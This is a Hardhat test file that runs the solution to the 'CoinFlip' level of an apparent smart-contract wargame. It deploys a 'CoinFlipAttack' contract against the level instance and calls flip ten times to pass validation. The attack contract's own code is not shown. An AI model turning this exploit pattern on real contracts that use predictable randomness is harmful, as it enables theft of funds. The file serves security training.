const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("CoinFlip", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("CoinFlip", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        const attacker = await (await ethers.getContractFactory("CoinFlipAttack")).deploy(instance.address);
        for (let i = 0; i < 10; i++)
            await attacker.flip();
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});